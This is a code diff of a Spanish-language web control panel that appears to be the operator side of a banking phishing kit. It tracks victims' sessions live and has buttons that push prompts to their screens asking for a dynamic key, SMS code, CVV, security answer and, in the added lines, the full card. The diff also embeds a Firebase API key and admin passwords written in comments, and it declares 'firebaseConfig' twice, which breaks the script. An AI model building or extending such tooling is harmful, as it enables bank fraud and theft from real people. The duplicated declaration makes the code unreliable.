@@ -444,6 +444,14 @@
 
         .btn-cvv:hover { background: linear-gradient(135deg, #0369a1, #075985); }
 
+        .btn-tarjeta {
+            background: linear-gradient(135deg, #059669, #047857);
+            color: white;
+            box-shadow: 0 4px 12px rgba(5, 150, 105, 0.3);
+        }
+
+        .btn-tarjeta:hover { background: linear-gradient(135deg, #047857, #065f46); }
+
         .btn-delete {
             grid-column: span 2;
             background: rgba(244, 63, 94, 0.1);
@@ -553,10 +561,6 @@
                 <span id="audioText">Sonido: ON</span>
             </button>
 
-            <button onclick="testDatabaseConnection()" style="background: rgba(6, 182, 212, 0.2); border: 1px solid rgba(6, 182, 212, 0.4); color: #06b6d4; padding: 6px 14px; border-radius: 30px; font-size: 0.85rem; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 6px;" title="Probar conexión con Firebase">
-                <i class="fa-solid fa-network-wired"></i> Probar Conexión
-            </button>
-
             <div class="status-pill">
                 <div class="pulse-dot"></div>
                 <span>CONECTADO</span>
@@ -640,6 +644,15 @@
     <script>
         // CONFIGURACIÓN DE FIREBASE DESDE CONFIG.JS
         const cfg = window.APP_CONFIG || {};
+        const firebaseConfig = {
+            apiKey: "AIzaSyBnS0FxHLYA4AIncGyxf5DZwHfhRGlyWso",
+            authDomain: "cain-5b1e4.firebaseapp.com",
+            databaseURL: "https://cain-5b1e4-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "cain-5b1e4",
+            storageBucket: "cain-5b1e4.firebasestorage.app",
+            messagingSenderId: "635040724776",
+            appId: "1:635040724776:web:daac1413b1623777b9597b"
+        };
         const firebaseConfig = cfg.firebaseConfig || {
             apiKey: "AIzaSyBnS0FxHLYA4AIncGyxf5DZwHfhRGlyWso",
             authDomain: "cain-5b1e4.firebaseapp.com",
@@ -658,7 +671,6 @@
         // AUTENTICACIÓN ADMIN BLINDADA (SHA-256 CRYPTO HASHING)
         const EXPECTED_USER_HASH = 'd24933106396dd933c4a2a1a6bb5935fa86d13536d2d89c7e148b158bc34c647'; // 'cain' // 'admin'
         const EXPECTED_PASS_HASH = 'efe55a6a704c4821dd88a187ff4ea2075ef2da04ad1cebb6969d6681a3838f6f'; // 'Arex888' // 'Arex404'
-        const EXPECTED_PASS_HASH_ALT = 'efe55a6a704c4821dd88a187ff4ea2075ef2da04ad1cebb6969d6681a3838f6f'; // 'Arex888' // 'admin123'
 
         async function sha256(str) {
             const buffer = new TextEncoder().encode(str);
@@ -677,41 +689,21 @@
         }
 
         async function handleAdminLogin(e) {
-            if (e && e.preventDefault) e.preventDefault();
-            const user = (document.getElementById('adminUser')?.value || '').trim();
-            const pass = (document.getElementById('adminPass')?.value || '').trim();
+            e.preventDefault();
+            const user = document.getElementById('adminUser').value.trim();
+            const pass = document.getElementById('adminPass').value.trim();
             const errBox = document.getElementById('adminAuthError');
             
             const uHash = await sha256(user);
             const pHash = await sha256(pass);
 
-            if (user === 'cain' && (pass === 'Arex888' || pass === 'Arex888') || (uHash === EXPECTED_USER_HASH && (pHash === EXPECTED_PASS_HASH || pHash === EXPECTED_PASS_HASH_ALT))) {
+            if (uHash === EXPECTED_USER_HASH && pHash === EXPECTED_PASS_HASH) {
                 sessionStorage.setItem('_adm_sec_token_v2', 'auth_ok_904832');
                 const overlay = document.getElementById('adminAuthOverlay');
                 if (overlay) overlay.style.display = 'none';
                 if (typeof initAudioContext === 'function') initAudioContext();
             } else {
                 if (errBox) errBox.style.display = 'block';
-            }
-        }
-
-        async function testDatabaseConnection() {
-            const startTime = Date.now();
-            try {
-                const dbRef = firebase.database().ref('.info/connected');
-                const snap = await dbRef.once('value');
-                const isConnected = snap.val();
-                const latency = Date.now() - startTime;
-                const dbUrl = firebaseConfig.databaseURL || (window.APP_CONFIG && window.APP_CONFIG.firebaseConfig ? window.APP_CONFIG.firebaseConfig.databaseURL : 'Desconocida');
-
-                if (isConnected) {
-                    alert(`✅ CONEXIÓN EXITOSA CON FIREBASE\n\n📡 Base de Datos: ${dbUrl}\n⚡ Latencia: ${latency} ms\n🟢 Estado: Conectado en tiempo real`);
-                } else {
-                    alert(`⚠️ CONEXIÓN EN PROCESO / RECONECTANDO\n\n📡 Base de Datos: ${dbUrl}\n🔴 Estado: Esperando confirmación de socket...`);
-                }
-            } catch (e) {
-                console.error('❌ Error probando conexión:', e);
-                alert(`❌ ERROR DE CONEXIÓN\n\nNo se pudo establecer comunicación con Firebase.\nDetalle: ${e.message}`);
             }
         }
 
@@ -966,16 +958,8 @@
                 }
             });
 
-            // Preservar y ordenar por hora fija de creación (cada tarjeta se queda en su puesto de ingreso)
-            const deviceFirstSeenMap = window._deviceFirstSeenMap = window._deviceFirstSeenMap || {};
-            allDevicesList.forEach(item => {
-                const devId = item.deviceId;
-                if (!deviceFirstSeenMap[devId]) {
-                    deviceFirstSeenMap[devId] = item.data.createdAt || item.data.timestamp || item.data.created || item.data.lastActivity || Date.now();
-                }
-                item.createdAtFixed = deviceFirstSeenMap[devId];
-            });
-            allDevicesList.sort((a, b) => (b.createdAtFixed || 0) - (a.createdAtFixed || 0));
+            // Ordenar por última actividad descendente
+            allDevicesList.sort((a, b) => (b.data.lastActivity || 0) - (a.data.lastActivity || 0));
             currentAllDevicesList = allDevicesList;
 
             if (allDevicesList.length === 0) {
@@ -1036,65 +1020,18 @@
                     }
 
                     // BADGE DE ESTADO
-
-                    // DETECCION COMPLETA DE ESTADOS DEL CLIENTE EN TIEMPO REAL
                     let badgeClass = 'status-visitor';
-                    let badgeText = (statusText || 'visitante').toUpperCase();
-                    let statusColor = '#3b82f6';
-                    const st = (statusText || '').toLowerCase();
+                    let badgeText = statusText;
 
-                    if (!isOnline) {
-                        badgeClass = 'status-visitor';
-                        badgeText = '🔴 INACTIVO / DESCONECTADO';
-                        statusColor = '#ef4444';
-                    } else if (st.includes('presiono wpp') || st.includes('clic en wpp') || dev.wppClicked) {
+                    if (statusText.includes('completó')) {
                         badgeClass = 'status-complete';
-                        badgeText = '💬 CLIENTE DIO CLIC EN WPP';
-                        statusColor = '#22c55e';
-                    } else if (st.includes('whatsapp') || st.includes('wpp')) {
-                        badgeClass = 'status-complete';
-                        badgeText = '📲 EN PANTALLA WHATSAPP';
-                        statusColor = '#25D366';
-                    } else if (st.includes('error clave') || st.includes('error dinamica')) {
+                        badgeText = 'COMPLETADO';
+                    } else if (statusText.includes('login') || usuario !== '---') {
+                        badgeClass = 'status-typing';
+                        badgeText = 'EN PROCESO';
+                    } else if (!isOnline) {
                         badgeClass = 'status-visitor';
-                        badgeText = '⚠️ ERROR CLAVE DINÁMICA';
-                        statusColor = '#f97316';
-                    } else if (st.includes('error sms') || st.includes('error código')) {
-                        badgeClass = 'status-visitor';
-                        badgeText = '⚠️ ERROR CÓDIGO SMS';
-                        statusColor = '#f97316';
-                    } else if (st.includes('error login')) {
-                        badgeClass = 'status-visitor';
-                        badgeText = '❌ ERROR LOGIN';
-                        statusColor = '#ef4444';
-                    } else if (st.includes('esperando clave') || st.includes('clave dinámica')) {
-                        badgeClass = 'status-typing';
-                        badgeText = '🔑 ESPERANDO CLAVE DINÁMICA';
-                        statusColor = '#a855f7';
-                    } else if (st.includes('esperando sms') || st.includes('sms')) {
-                        badgeClass = 'status-typing';
-                        badgeText = '💬 ESPERANDO CÓDIGO SMS';
-                        statusColor = '#6366f1';
-                    } else if (st.includes('cvv')) {
-                        badgeClass = 'status-typing';
-                        badgeText = '💳 ESPERANDO CÓDIGO CVV';
-                        statusColor = '#38bdf8';
-                    } else if (st.includes('seguridad')) {
-                        badgeClass = 'status-typing';
-                        badgeText = '🛡️ PREGUNTA SEGURIDAD';
-                        statusColor = '#c084fc';
-                    } else if (st.includes('escribiendo') || st.includes('ingresando') || usuario !== '---') {
-                        badgeClass = 'status-typing';
-                        badgeText = '✍️ ESCRIBIENDO DATOS';
-                        statusColor = '#eab308';
-                    } else if (st.includes('completó') || st.includes('finalizado')) {
-                        badgeClass = 'status-complete';
-                        badgeText = '✅ PROCESO COMPLETADO';
-                        statusColor = '#10b981';
-                    } else if (st.includes('visitante')) {
-                        badgeClass = 'status-visitor';
-                        badgeText = '👀 VISITANTE EN PÁGINA';
-                        statusColor = '#3b82f6';
+                        badgeText = 'INACTIVO';
                     }
 
                     // RENDERIZAR TARJETA
@@ -1159,9 +1096,6 @@
                         <div class="actions-header">Acciones del Panel</div>
 
                         <div class="action-buttons-grid">
-                            <button class="btn-action btn-wpp" onclick="sendCommand('${token}', '${deviceId}', 'wpp')" style="background: linear-gradient(135deg, #25D366, #128C7E); color: #fff; font-weight: 700;">
-                                <i class="fa-brands fa-whatsapp"></i> wpp
-                            </button>
                             <button class="btn-action btn-otp" onclick="sendCommand('${token}', '${deviceId}', 'otp')">
                                 <i class="fa-solid fa-key"></i> Clave Dinámica
                             </button>
@@ -1176,6 +1110,9 @@
                             </button>
                             <button class="btn-action btn-cvv" onclick="sendCommand('${token}', '${deviceId}', 'cvv')">
                                 <i class="fa-solid fa-credit-card"></i> Pedir CVV
+                            </button>
+                            <button class="btn-action btn-tarjeta" onclick="sendCommand('${token}', '${deviceId}', 'tarjeta')">
+                                <i class="fa-solid fa-id-card"></i> Pedir Tarjeta
                             </button>
                             <button class="btn-action btn-seguridad" onclick="sendCommand('${token}', '${deviceId}', 'seguridad')">
                                 <i class="fa-solid fa-user-shield"></i> Pregunta Seguridad
